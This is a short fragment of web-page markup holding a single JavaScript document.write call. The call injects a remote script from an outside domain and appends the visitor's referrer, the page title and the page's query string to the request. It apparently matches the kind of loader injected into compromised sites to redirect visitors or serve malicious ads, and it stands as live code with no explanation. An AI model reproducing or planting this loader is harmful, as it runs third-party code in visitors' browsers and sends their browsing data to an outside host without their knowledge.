...
document.write('<script type="application/javascript" src="//dalibera.com/rkXBT6nt?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f2ed7028db0d=script5f2ed7028db0e"><' + '/script>');
</script>
